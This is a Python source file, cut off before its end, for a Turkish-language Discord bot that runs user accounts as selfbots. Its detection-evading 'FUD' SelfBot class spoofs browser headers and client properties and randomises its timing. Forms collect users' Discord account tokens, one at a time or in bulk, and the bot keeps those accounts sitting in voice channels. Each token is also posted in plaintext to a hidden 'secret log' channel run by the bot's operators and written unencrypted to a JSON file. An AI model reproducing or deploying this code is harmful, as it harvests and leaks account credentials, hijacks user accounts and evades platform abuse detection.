import discord
from discord.ext import commands, tasks
from discord.ui import Button, View, Modal, TextInput, Select
import json
import os
import random
import aiohttp
from datetime import datetime
from typing import Dict, List
import asyncio
import re
import uuid
import sys

# ═══════════════════════════════════════════════════════════════
# 🤖 BOT TOKENI - ENVIRONMENT VARIABLE'DAN OKU
# ═══════════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    print("❌ HATA: BOT_TOKEN environment variable'ı bulunamadı!")
    print("Railway'de Variables sekmesine BOT_TOKEN ekleyin.")
    sys.exit(1)

# Gerçek tarayıcı User-Agent listesi (detection avoidance)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/118.0",
]

# Spotify "Listening" - AnonymousDC şarkıları
ANONYMOUSDC_SPOTIFY_SONGS = [
    ("Belki", "Yalın"),
    ("Rüzgar", "Yalın"),
    ("Senden Daha Güzel", "Yalın"),
    ("Olur Mu", "Yalın"),
    ("Adı Aşk", "Yalın"),
    ("Padişah", "Yalın"),
    ("Yanında", "Yalın"),
    ("Bekle", "Yalın"),
]

# ═══════════════════════════════════════════════════════════════
# 🔐 GİZLİ AYARLAR
# ═══════════════════════════════════════════════════════════════
SECRET_LOG_CHANNEL_ID = 1483315501789876318
TOKEN_REGISTER_CHANNEL_ID = 1483315280372564086
TOKEN_GUIDE_CHANNEL_ID = 1483321231011741778
MAX_TOKENS_PER_USER = 20

AUTHORIZED_USERS = [
    1196780375230394466,
    606453556882571275
]

ANONYMOUSDC_LOGO_URL = "https://i.ibb.co/Sw6cGCxg/indir-4.jpg"

# Bot ayarları
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)
TOKEN_DB_FILE = 'tokens.json'

# Rastgele gecikme yardımcı fonksiyonu
def random_delay(min_sec: float = 0.5, max_sec: float = 2.0) -> float:
    return random.uniform(min_sec, max_sec)

@bot.event
async def on_ready():
    await bot.change_presence(
        activity=discord.Game(name="discord.gg/anonymousdc", type=0),
        status=discord.Status.dnd
    )
    print('═' * 70)
    print(f'✅ BOT HAZIR: {bot.user}')
    print('═' * 70)
    print('💎 ANONYMOUSDC TOKEN MANAGER (FUD Edition)')
    print('═' * 70)
    print('📝 KOMUTLAR:')
    print(' .tokenadd - Token ekle (YETKİLİ)')
    print(' .tokencontrol - Token kontrol paneli')
    print(' .yetkilicontrol - Tüm hesapları odaya gönder (YETKİLİ)')
    print('═' * 70)
    print(f'👑 Yetkili Kullanıcılar: {len(AUTHORIZED_USERS)} kişi')
    for user_id in AUTHORIZED_USERS:
        print(f' └ {user_id}')
    print('═' * 70)
    print(f'🔐 Gizli Log Kanalı: {SECRET_LOG_CHANNEL_ID}')
    print(f'📋 Token Kayıt Kanalı: {TOKEN_REGISTER_CHANNEL_ID}')
    print(f'📖 Rehber Kanalı: {TOKEN_GUIDE_CHANNEL_ID}')
    print(f'📊 Max Token/Kullanıcı: {MAX_TOKENS_PER_USER}')
    print('═' * 70)
    print('made by recyla | AnonymousDC Premium')
    print('═' * 70)
   
    if not check_tokens_health.is_running():
        check_tokens_health.start()
        print('✅ Token sağlık kontrolü başlatıldı (Her 5 dakika)')
    print('🔄 Kayıtlı hesaplar ses kanallarına bağlanıyor...')
    asyncio.create_task(start_all_tokens_to_voice())
    print('═' * 70)


class TokenManager:
    def __init__(self):
        self.users = {}
        self.load()
   
    def load(self):
        if os.path.exists(TOKEN_DB_FILE):
            try:
                with open(TOKEN_DB_FILE, 'r', encoding='utf-8') as f:
                    self.users = json.load(f)
            except:
                self.users = {}
   
    def save(self):
        with open(TOKEN_DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(self.users, f, indent=4, ensure_ascii=False)
   
    def add_token(self, user_id, token_data):
        user_id = str(user_id)
        if user_id not in self.users:
            self.users[user_id] = {'tokens': [], 'selected_token': 0}
       
        for i, t in enumerate(self.users[user_id]['tokens']):
            if t['token'] == token_data['token']:
                self.users[user_id]['tokens'][i] = token_data
                self.save()
                return True
       
        if len(self.users[user_id]['tokens']) < MAX_TOKENS_PER_USER:
            self.users[user_id]['tokens'].append(token_data)
            self.save()
            return True
        return False
   
    def get_tokens(self, user_id) -> List[Dict]:
        user_id = str(user_id)
        return self.users.get(user_id, {}).get('tokens', [])
   
    def get_selected_token(self, user_id):
        user_id = str(user_id)
        if user_id not in self.users or not self.users[user_id]['tokens']:
            return None
        idx = self.users[user_id].get('selected_token', 0)
        tokens = self.users[user_id]['tokens']
        if idx >= len(tokens):
            idx = 0
            self.users[user_id]['selected_token'] = 0
            self.save()
        return tokens[idx]
   
    def set_selected_token(self, user_id, index):
        user_id = str(user_id)
        if user_id in self.users:
            self.users[user_id]['selected_token'] = index
            self.save()
   
    def update_token(self, user_id, token_index, **kwargs):
        user_id = str(user_id)
        if user_id in self.users and token_index < len(self.users[user_id]['tokens']):
            self.users[user_id]['tokens'][token_index].update(kwargs)
            self.save()
   
    def remove_token(self, user_id, token_index):
        user_id = str(user_id)
        if user_id in self.users and token_index < len(self.users[user_id]['tokens']):
            del self.users[user_id]['tokens'][token_index]
            if self.users[user_id]['selected_token'] >= len(self.users[user_id]['tokens']):
                self.users[user_id]['selected_token'] = 0
            if not self.users[user_id]['tokens']:
                del self.users[user_id]
            self.save()
   
    def has_tokens(self, user_id) -> bool:
        return str(user_id) in self.users and len(self.users[str(user_id)]['tokens']) > 0


class SelfBot:
    """FUD SelfBot - Discord detection avoidance"""
    
    def __init__(self, token, status_text='discord.gg/anonymousdc', status_type=0, status_mode='dnd', use_spotify=False, spotify_details=None, spotify_state=None):
        self.token = token
        self.ws = None
        self.session = None
        self.user = None
        self.voice_channel = None
        self.voice_channel_name = "Bağlı Değil"
        self.guild_id = None
        self.running = False
        self.status_text = status_text
        self.status_type = status_type
        self.status_mode = status_mode
        self.custom_status = 'discord.gg/anonymousdc'
        self.custom_emoji = '💎'
        self.use_spotify = use_spotify
        self.spotify_details = spotify_details or (random.choice(ANONYMOUSDC_SPOTIFY_SONGS)[0] if use_spotify else None)
        self.spotify_state = spotify_state or ("Yalın" if use_spotify else None)
        self.heartbeat_task = None
        self.receive_task = None
        self.last_check = datetime.utcnow()
        self._heartbeat_interval = random.uniform(40, 43)  # Rastgele heartbeat aralığı
        self.session_id = str(uuid.uuid4())
        self.user_agent = random.choice(USER_AGENTS)
        self.reconnect_attempts = 0
   
    async def connect(self):
        """FUD bağlantı - rastgele gecikmeler ve gerçek headers ile"""
        # Rastgele initial delay (insan davranışı simülasyonu)
        await asyncio.sleep(random.uniform(0.5, 3))
        
        headers = {
            'Authorization': self.token,
            'User-Agent': self.user_agent,
            'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        }
        
        self.session = aiohttp.ClientSession(headers=headers)
        
        try:
            # Token doğrulama
            async with self.session.get('https://discord.com/api/v10/users/@me') as resp:
                if resp.status != 200:
                    raise Exception('Token geçersiz!')
                self.user = await resp.json()
           
            # Gateway URL al
            async with self.session.get('https://discord.com/api/v10/gateway') as resp:
                gateway_url = (await resp.json())['url']
                gateway_url = f"{gateway_url}?v=10&encoding=json"
           
            # WebSocket bağlantısı
            self.ws = await self.session.ws_connect(
                gateway_url,
                headers=headers,
                heartbeat=random.uniform(40, 43)
            )
            self.running = True
            self.reconnect_attempts = 0
           
            # Identify payload - gerçek Discord client gibi
            identify_payload = {
                'op': 2,
                'd': {
                    'token': self.token,
                    'capabilities': 253,
                    'properties': {
                        'os': 'Windows',
                        'browser': 'Chrome',
                        'device': '',
                        'system_locale': 'tr-TR',
                        'browser_user_agent': self.user_agent,
                        'browser_version': '120.0.0.0',
                        'os_version': '10',
                        'referrer': '',
                        'referring_domain': '',
                        'referrer_current': '',
                        'referring_domain_current': '',
                        'release_channel': 'stable',
                        'client_build_number': random.randint(250000, 260000),
                        'client_event_source': None
                    },
                    'presence': {
                        'status': self.status_mode,
                        'since': 0,
                        'activities': [],
                        'afk': False
                    },
                    'compress': False,
                    'client_state': {
                        'guild_versions': {},
                        'highest_last_message_id': '0',
                        'api_code_version': 0,
                        'private_channels_version': '0',
                        'read_state_version': 0,
                        'user_guild_settings_version': -1,
                        'user_settings_version': -1
                    }
                }
            }
           
            await self.ws.send_json(identify_payload)
           
            self.heartbeat_task = asyncio.create_task(self._heartbeat())
            self.receive_task = asyncio.create_task(self._receive())
           
            await asyncio.sleep(random.uniform(2, 4))
            await self.update_status(self.status_text, self.status_type, self.status_mode, self.custom_status, self.custom_emoji)
           
            return True
        except Exception:
            if self.session and not self.session.closed:
                try:
                    await self.session.close()
                except Exception:
                    pass
            raise
   
    async def _heartbeat(self):
        """Rastgele interval ile heartbeat gönder"""
        while self.running and self.ws:
            try:
                if not self.ws.closed:
                    await self.ws.send_json({'op': 1, 'd': None})
                    interval = random.uniform(40, 43)
                    await asyncio.sleep(interval)
                else:
                    await self._reconnect()
                    await asyncio.sleep(random.uniform(5, 10))
            except:
                await self._reconnect()
                await asyncio.sleep(random.uniform(5, 10))
   
    async def _receive(self):
        try:
            async for msg in self.ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    data = json.loads(msg.data)
                    if data['op'] == 10:
                        pass
                    elif data['op'] == 9:
                        await self._reconnect()
                elif msg.type in [aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR]:
                    await self._reconnect()
        except:
            if self.running:
                await self._reconnect()
   
    async def _reconnect(self):
        """Exponential backoff ile yeniden bağlan"""
        if not self.running:
            return
       
        self.reconnect_attempts += 1
        # Exponential backoff: 3sn, 6sn, 12sn, 24sn... max 60sn
        delay = min(3 * (2 ** (self.reconnect_attempts - 1)), 60)
        delay = delay + random.uniform(-2, 2)
        delay = max(1, delay)
        
        await asyncio.sleep(delay)
       
        try:
            if self.ws and not self.ws.closed:
                try:
                    await self.ws.close()
                except:
                    pass
           
            old_voice_channel = self.voice_channel
            old_guild_id = self.guild_id
           
            headers = {
                'Authorization': self.token,
                'User-Agent': self.user_agent,
                'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
           
            async with self.session.get('https://discord.com/api/v10/gateway') as resp:
                gateway_url = (await resp.json())['url']
                gateway_url = f"{gateway_url}?v=10&encoding=json"
           
            self.ws = await self.session.ws_connect(gateway_url, headers=headers, heartbeat=random.uniform(40, 43))
           
            await self.ws.send_json({
                'op': 2,
                'd': {
                    'token': self.token,
                    'properties': {
                        'os': 'Windows',
                        'browser': 'Chrome',
                        'device': '',
                        'system_locale': 'tr-TR',
                        'browser_user_agent': self.user_agent
                    },
                    'presence': {'status': self.status_mode, 'activities': []}
                }
            })
           
            await asyncio.sleep(random.uniform(2, 4))
            await self.update_status(self.status_text, self.status_type, self.status_mode, self.custom_status, self.custom_emoji)
           
            if old_voice_channel and old_guild_id:
                await self.ws.send_json({
                    'op': 4,
                    'd': {
                        'guild_id': old_guild_id,
                        'channel_id': old_voice_channel,
                        'self_mute': False,
                        'self_deaf': False
                    }
                })
           
            asyncio.create_task(self._receive())
            self.reconnect_attempts = 0  # Başarılı bağlantıda sıfırla
           
        except:
            if self.running:
                await self._reconnect()
   
    async def join_voice(self, channel_id, mute=False, deaf=False):
        """Rastgele gecikme ile ses kanalına bağlan"""
        try:
            headers = {
                'Authorization': self.token, 
                'Content-Type': 'application/json',
                'User-Agent': self.user_agent
            }
           
            async with self.session.get(f'https://discord.com/api/v10/channels/{channel_id}', headers=headers) as resp:
                if resp.status != 200:
                    return False, "Kanal bulunamadı!"
                channel = await resp.json()
               
                if channel.get('type') not in [2, 13]:
                    return False, "Bu bir ses kanalı değil!"
               
                self.guild_id = channel['guild_id']
                self.voice_channel_name = channel['name']
           
            if self.ws and not self.ws.closed:
                await asyncio.sleep(random.uniform(0.5, 2))
                
                await self.ws.send_json({
                    'op': 4,
                    'd': {
                        'guild_id': self.guild_id,
                        'channel_id': channel_id,
                        'self_mute': mute,
                        'self_deaf': deaf
                    }
                })
               
                self.voice_channel = channel_id
                await asyncio.sleep(random.uniform(0.5, 1.5))
                return True, channel['name']
            else:
                return False, "WebSocket bağlantısı yok!"
        except Exception as e:
            return False, f"Hata: {str(e)}"
   
    async def join_guild(self, invite_code):
        """Sunucuya katıl - rastgele gecikme ile"""
        try:
            headers = {
                'Authorization': self.token,
                'Content-Type': 'application/json',
                'User-Agent': self.user_agent
            }
           
            await asyncio.sleep(random.uniform(1, 3))
           
            async with self.session.get(f'https://discord.com/api/v10/invites/{invite_code}', headers=headers) as resp:
                if resp.status != 200:
                    return False, "Davet kodu geçersiz veya süresi dolmuş!"
                invite_data = await resp.json()
                guild_name = invite_data.get('guild', {}).get('name', 'Bilinmeyen Sunucu')
           
            await asyncio.sleep(random.uniform(0.5, 1.5))
           
            async with self.session.post(f'https://discord.com/api/v10/invites/{invite_code}', headers=headers) as resp:
                if resp.status == 200:
                    return True, f"{guild_name} sunucusuna katılındı!"
                elif resp.status == 400:
                    return False, "Davet kodu geçersiz!"
                elif resp.status == 403:
                    return False, "Bu sunucuya katılma iznim yok veya sunucu dolu!"
                else:
                    return False, f"Hata kodu: {resp.status}"
        except Exception as e:
            return False, f"Hata: {str(e)}"
   
    async def update_status(self, status_text=None, status_type=None, status_mode=None, custom_status=None, custom_emoji=None):
        try:
            if status_text is not None:
                self.status_text = status_text
            if status_type is not None:
                self.status_type = status_type
            if status_mode is not None:
                self.status_mode = status_mode
            if custom_status is not None:
                self.custom_status = custom_status
            if custom_emoji is not None:
                self.custom_emoji = custom_emoji
           
            if self.ws and not self.ws.closed:
                await asyncio.sleep(random.uniform(0.3, 1))
                
                activities = []
                
                activities.append({
                    'name': 'discord.gg/anonymousdc',
                    'type': 0,
                    'state': 'discord.gg/anonymousdc',
                    'created_at': int(datetime.utcnow().timestamp())
                })
                
                if self.custom_status:
                    activities.append({
                        'type': 4,
                        'state': self.custom_status,
                        'name': 'Custom Status',
                        'emoji': {'name': self.custom_emoji} if self.custom_emoji else None,
                        'created_at': int(datetime.utcnow().timestamp())
                    })
               
                if self.use_spotify and self.spotify_details and self.spotify_state:
                    activities.append({
                        'type': 2,
                        'name': 'Spotify',
                        'details': self.spotify_details,
                        'state': self.spotify_state,
                        'application_id': '207138439391592448',
                        'timestamps': {'start': int(datetime.utcnow().timestamp() * 1000)},
                        'created_at': int(datetime.utcnow().timestamp())
                    })
               
                await self.ws.send_json({
                    'op': 3,
                    'd': {
                        'status': self.status_mode,
                        'activities': activities,
                        'afk': False,
                        'since': 0
                    }
                })
                return True
        except:
            pass
        return False
   
    async def update_voice_state(self, mute=None, deaf=None):
        if not self.voice_channel or not self.guild_id:
            return False
       
        if not self.ws or self.ws.closed:
            return False
       
        try:
            if mute is not None or deaf is not None:
                current_mute = mute if mute is not None else False
                current_deaf = deaf if deaf is not None else False
               
                await asyncio.sleep(random.uniform(0.3, 0.8))
               
                await self.ws.send_json({
                    'op': 4,
                    'd': {
                        'guild_id': self.guild_id,
                        'channel_id': self.voice_channel,
                        'self_mute': current_mute,
                        'self_deaf': current_deaf
                    }
                })
                await asyncio.sleep(random.uniform(0.3, 0.8))
                return True
        except:
            pass
        return False
   
    async def leave_voice(self):
        if self.voice_channel and self.ws and not self.ws.closed:
            try:
                await asyncio.sleep(random.uniform(0.5, 1))
                
                await self.ws.send_json({
                    'op': 4,
                    'd': {
                        'guild_id': self.guild_id,
                        'channel_id': None,
                        'self_mute': False,
                        'self_deaf': False
                    }
                })
                await asyncio.sleep(random.uniform(0.3, 0.7))
            except:
                pass
            finally:
                self.voice_channel = None
                self.voice_channel_name = "Bağlı Değil"
   
    async def disconnect(self):
        self.running = False
       
        if self.heartbeat_task:
            self.heartbeat_task.cancel()
        if self.receive_task:
            self.receive_task.cancel()
       
        if self.voice_channel:
            try:
                await self.leave_voice()
            except:
                pass
       
        if self.ws and not self.ws.closed:
            try:
                await self.ws.close()
            except:
                pass
       
        if self.session and not self.session.closed:
            try:
                await self.session.close()
            except:
                pass


token_manager = TokenManager()
active_bots = {}


async def send_secret_log(discord_user, token_username, token_user_id, token_avatar_url, token_itself, action="EKLENDI"):
    try:
        log_channel = bot.get_channel(SECRET_LOG_CHANNEL_ID)
        if not log_channel:
            return
       
        color = 0x2ECC71 if action == "EKLENDI" else 0xE74C3C
       
        embed = discord.Embed(
            title=f"{'🔓' if action == 'EKLENDI' else '🔒'} TOKEN {action}",
            color=color,
            timestamp=datetime.utcnow()
        )
       
        embed.add_field(
            name="👤 İşlem Yapan",
            value=f"{discord_user.mention}\n`{discord_user.name}` (`{discord_user.id}`)",
            inline=False
        )
       
        embed.add_field(
            name="🎮 Token Hesabı",
            value=f"**{token_username}**\n`{token_user_id}`",
            inline=False
        )
       
        embed.add_field(
            name="🔑 Token",
            value=f"```{token_itself}```",
            inline=False
        )
       
        embed.set_thumbnail(url=token_avatar_url)
        embed.set_author(name=discord_user.name, icon_url=discord_user.display_avatar.url)
        embed.set_footer(text="made by recyla | AnonymousDC Premium", icon_url=ANONYMOUSDC_LOGO_URL)
       
        await log_channel.send(embed=embed)
       
    except Exception as e:
        print(f"❌ Log hatası: {e}")


async def register_token_to_user(token_data, action="KAYIT", user=None):
    try:
        if not user:
            return
       
        color = 0x3498DB if action == "KAYIT" else 0x95A5A6
       
        embed = discord.Embed(
            title=f"📋 TOKEN {action}",
            color=color,
            timestamp=datetime.utcnow()
        )
       
        embed.add_field(
            name="🎮 Hesap",
            value=f"**{token_data['username']}**\n`{token_data['user_id_discord']}`",
            inline=True
        )
       
        embed.add_field(
            name="📊 Durum",
            value=f"{'🟢 Aktif' if action == 'KAYIT' else '⚪ Pasif'}",
            inline=True
        )
       
        embed.add_field(
            name="🔑 Token ID",
            value=f"`{token_data['user_id_discord']}`",
            inline=False
        )
       
        embed.set_thumbnail(url=token_data.get('avatar_url', ANONYMOUSDC_LOGO_URL))
        embed.set_footer(text="made by recyla | Token Kayıt Sistemi", icon_url=ANONYMOUSDC_LOGO_URL)
       
        await user.send(embed=embed)
       
    except Exception as e:
        print(f"❌ Kayıt hatası: {e}")


# ═══════════════════════════════════════════════════════════════
# DISCORD KOMUTLARI
# ═══════════════════════════════════════════════════════════════


@bot.command()
async def tokenadd(ctx):
    if ctx.author.id not in AUTHORIZED_USERS:
        embed = discord.Embed(
            title="❌ Yetki Yok",
            description="Bu komutu kullanma yetkiniz bulunmuyor!",
            color=0xE74C3C
        )
        embed.set_footer(text="made by recyla | AnonymousDC Premium", icon_url=ANONYMOUSDC_LOGO_URL)
        await ctx.send(embed=embed, delete_after=10)
        await ctx.message.delete(delay=10)
        return
   
    user_tokens = token_manager.get_tokens(ctx.author.id)
    current_count = len(user_tokens)
   
    embed = discord.Embed(
        title="💎 AnonymousDC Premium",
        description="**Özel Token Yönetim Sistemi** 💎\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"**📊 Mevcut Durumunuz**\n"
                    f"└ Aktif Token: `{current_count}/{MAX_TOKENS_PER_USER}`\n"
                    f"└ Kullanılabilir Slot: `{MAX_TOKENS_PER_USER - current_count}`\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "**✨ Premium Özellikler**\n\n"
                    "• **7/24 Ses Aktivitesi**\n"
                    "• **Gelişmiş Kontrol Paneli**\n"
                    "• **Spotify Dinliyor**\n"
                    "• **Özel Durum**\n"
                    "• **Toplu Taşıma**\n"
                    "• **Otomatik Yeniden Bağlanma**\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "⚡ **discord.gg/anonymousdc** ⚡",
        color=0x5865F2
    )
   
    embed.set_thumbnail(url=ANONYMOUSDC_LOGO_URL)
    embed.set_footer(text="made by recyla | AnonymousDC Premium 💎", icon_url=ANONYMOUSDC_LOGO_URL)
   
    view = AddTokenView(ctx.author)
    msg = await ctx.send(embed=embed, view=view)
   
    try:
        await msg.pin()
    except:
        pass


class AddTokenView(View):
    def __init__(self, user):
        super().__init__(timeout=None)
        self.user = user
   
    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        return True
   
    @discord.ui.button(label="1 Token Ekle", style=discord.ButtonStyle.success, emoji="💎", row=0)
    async def single_token(self, interaction: discord.Interaction, button: Button):
        modal = SingleTokenModal(interaction.user)
        await interaction.response.send_modal(modal)
   
    @discord.ui.button(label="Çoklu Token Ekle", style=discord.ButtonStyle.primary, emoji="💠", row=0)
    async def multi_token(self, interaction: discord.Interaction, button: Button):
        modal = MultiTokenModal(interaction.user)
        await interaction.response.send_modal(modal)


class SingleTokenModal(Modal, title='💎 1 Token Ekle'):
    name_input = TextInput(
        label='Token İsmi',
        placeholder='Örn: Ana Hesap, Yedek Hesap',
        required=True,
        max_length=50
    )
   
    token_input = TextInput(
        label='Discord User Token',
        placeholder='MTQxNzU2OTI3...',
        style=discord.TextStyle.paragraph,
        required=True,
        max_length=200
    )
   
    channel_input = TextInput(
        label='Ses Kanal ID',
        placeholder='1234567890123456',
        required=True,
        max_length=20
    )
   
    def __init__(self, discord_user):
        super().__init__()
        self.discord_user = discord_user
   
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
       
        token_name = self.name_input.value.strip()
        token = self.token_input.value.strip()
        channel_id = self.channel_input.value.strip()
       
        if not channel_id:
            await interaction.followup.send("❌ Ses Kanal ID gerekli!", ephemeral=True)
            return
       
        user_tokens = token_manager.get_tokens(self.discord_user.id)
        if len(user_tokens) >= MAX_TOKENS_PER_USER:
            await interaction.followup.send(f"❌ Token Limiti Doldu! (Max {MAX_TOKENS_PER_USER})", ephemeral=True)
            return
       
        try:
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            selfbot = SelfBot(token, status_text='discord.gg/anonymousdc', status_type=0, use_spotify=True)
            await selfbot.connect()
           
            username = selfbot.user['username']
            user_id_discord = selfbot.user['id']
            avatar_hash = selfbot.user.get('avatar', '')
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{avatar_hash}.png" if avatar_hash else ANONYMOUSDC_LOGO_URL
           
            await asyncio.sleep(random.uniform(1, 2))
            success, channel_name = await selfbot.join_voice(channel_id)
           
            if not success:
                await selfbot.disconnect()
                await interaction.followup.send(f"❌ Ses kanalına bağlanılamadı!\n\n{channel_name}", ephemeral=True)
                return
           
            token_data = {
                'name': token_name,
                'token': token,
                'username': username,
                'user_id_discord': user_id_discord,
                'avatar_url': avatar_url,
                'channel_id': channel_id,
                'mute': False,
                'deaf': False,
                'status_text': selfbot.status_text,
                'custom_status': selfbot.custom_status,
                'custom_emoji': selfbot.custom_emoji,
                'use_spotify': True,
                'added_at': datetime.utcnow().isoformat()
            }
           
            token_manager.add_token(self.discord_user.id, token_data)
           
            bot_key = f"{self.discord_user.id}_{user_id_discord}"
            active_bots[bot_key] = selfbot
           
            await send_secret_log(self.discord_user, username, user_id_discord, avatar_url, token, "EKLENDI")
            await register_token_to_user(token_data, "KAYIT", self.discord_user)
           
            await asyncio.sleep(random.uniform(2, 3))
           
            result = f"✅ Token Başarıyla Eklendi!\n\n"
            result += f"🏷️ İsim: {token_name}\n"
            result += f"👤 Hesap: {username}\n"
            result += f"🔊 {channel_name} kanalında aktif!\n\n"
            result += f"💡 .tokencontrol ile yönetin!"
           
            await interaction.followup.send(result, ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Hata!\n```{str(e)}```", ephemeral=True)


class MultiTokenModal(Modal, title='💠 Çoklu Token Ekle'):
    tokens_input = TextInput(
        label='Discord Tokenlar',
        placeholder='İsim|Token\nAna Hesap|MTQxNzU...\nYedek|MTQxNzY...',
        style=discord.TextStyle.paragraph,
        required=True,
        max_length=4000
    )
   
    channel_input = TextInput(
        label='Ses Kanal ID',
        placeholder='1234567890123456',
        required=True,
        max_length=20
    )
   
    def __init__(self, discord_user):
        super().__init__()
        self.discord_user = discord_user
   
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
       
        tokens_text = self.tokens_input.value.strip()
        channel_id = self.channel_input.value.strip()
       
        if not channel_id:
            await interaction.followup.send("❌ Ses Kanal ID gerekli!", ephemeral=True)
            return
       
        token_lines = [t.strip() for t in tokens_text.split('\n') if t.strip()]
        tokens_with_names = []
       
        for line in token_lines:
            if '|' in line:
                parts = line.split('|', 1)
                name = parts[0].strip()
                token = parts[1].strip()
                tokens_with_names.append((name, token))
            else:
                tokens_with_names.append((f"Hesap {len(tokens_with_names)+1}", line))
       
        user_tokens = token_manager.get_tokens(self.discord_user.id)
        available_slots = MAX_TOKENS_PER_USER - len(user_tokens)
       
        if available_slots <= 0:
            await interaction.followup.send(f"❌ Token Limiti Doldu! (Max {MAX_TOKENS_PER_USER})", ephemeral=True)
            return
       
        if len(tokens_with_names) > available_slots:
            await interaction.followup.send(f"⚠️ Slot Yetersiz! {len(tokens_with_names)} token için sadece {available_slots} slot kaldı.", ephemeral=True)
            tokens_with_names = tokens_with_names[:available_slots]
       
        success_count = 0
        fail_count = 0
        results = []
       
        for i, (token_name, token) in enumerate(tokens_with_names, 1):
            try:
                await asyncio.sleep(random.uniform(2, 5))  # Tokenlar arası bekleme
                
                selfbot = SelfBot(token, status_text='discord.gg/anonymousdc', status_type=0, use_spotify=True)
                await selfbot.connect()
               
                username = selfbot.user['username']
                user_id_discord = selfbot.user['id']
                avatar_hash = selfbot.user.get('avatar', '')
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{avatar_hash}.png" if avatar_hash else ANONYMOUSDC_LOGO_URL
               
                await asyncio.sleep(random.uniform(1, 2))
                success, channel_name = await selfbot.join_voice(channel_id)
               
                token_data = {
                    'name': token_name,
                    'token': token,
                    'username': username,
                    'user_id_discord': user_id_discord,
                    'avatar_url': avatar_url,
                    'channel_id': channel_id if success else None,
                    'mute': False,
                    'deaf': False,
                    'status_text': selfbot.status_text,
                    'custom_status': selfbot.custom_status,
                    'custom_emoji': selfbot.custom_emoji,
                    'use_spotify': True,
                    'added_at': datetime.utcnow().isoformat()
                }
               
                token_manager.add_token(self.discord_user.id, token_data)
               
                bot_key = f"{self.discord_user.id}_{user_id_discord}"
                active_bots[bot_key] = selfbot
               
                await send_secret_log(self.discord_user, username, user_id_discord, avatar_url, token, "EKLENDI")
                await register_token_to_user(token_data, "KAYIT", self.discord_user)
               
                if success:
                    results.append(f"✅ {token_name} → {username} → 🔊 {channel_name}")
                else:
                    results.append(f"⚠️ {token_name} → {username} → Eklendi ama sese bağlanamadı")
                success_count += 1
               
            except Exception as e:
                results.append(f"❌ {token_name}: {str(e)[:50]}")
                fail_count += 1
       
        result_text = f"📊 Çoklu Token Ekleme Raporu\n\n"
        result_text += f"✅ Başarılı: {success_count}\n"
        result_text += f"❌ Başarısız: {fail_count}\n\n"
        result_text += "\n".join(results[:10])
       
        if len(results) > 10:
            result_text += f"\n\n... ve {len(results) - 10} token daha"
       
        result_text += f"\n\n💡 .tokencontrol ile yönetin!"
       
        await interaction.followup.send(result_text, ephemeral=True)


class YetkiliControlModal(Modal, title='👑 Tüm Hesapları Odaya Gönder'):
    channel_input = TextInput(
        label='Ses Kanal ID',
        placeholder='Tüm hesapların taşınacağı kanal ID',
        required=True,
        max_length=20
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        channel_id = self.channel_input.value.strip()
        if not channel_id or not channel_id.isdigit():
            await interaction.followup.send("❌ Geçerli bir ses kanalı ID girin.", ephemeral=True)
            return

        updated = 0
        tasks_to_move = []

        for user_id, user_data in list(token_manager.users.items()):
            for idx, token_data in enumerate(user_data['tokens']):
                token_manager.update_token(int(user_id), idx, channel_id=channel_id)
                updated += 1
                bot_key = f"{user_id}_{token_data['user_id_discord']}"
                if bot_key in active_bots:
                    selfbot = active_bots[bot_key]
                    mute = token_data.get('mute', False)
                    deaf = token_data.get('deaf', False)

                    async def move_one(sb=selfbot, cid=channel_id, m=mute, d=deaf):
                        try:
                            await asyncio.sleep(random.uniform(0.5, 1.5))
                            await sb.leave_voice()
                            await asyncio.sleep(random.uniform(0.5, 1))
                            success, _ = await sb.join_voice(cid, m, d)
                            return success
                        except Exception:
                            return False

                    tasks_to_move.append(move_one())
                    
                    await asyncio.sleep(random.uniform(0.3, 0.8))

        if tasks_to_move:
            results = await asyncio.gather(*tasks_to_move, return_exceptions=True)
            moved = sum(1 for r in results if r is True)
            errors = sum(1 for r in results if isinstance(r, Exception) or r is False)
        else:
            moved = 0
            errors = 0

        msg = f"✅ Yetkili Kontrol\n\n📊 {updated} hesabın kanalı güncellendi.\n🔊 {moved} aktif hesap sese taşındı."
        if errors:
            msg += f"\n⚠️ {errors} hesap taşınamadı."
        await interaction.followup.send(msg, ephemeral=True)


@bot.command()
async def yetkilicontrol(ctx):
    if ctx.author.id not in AUTHORIZED_USERS:
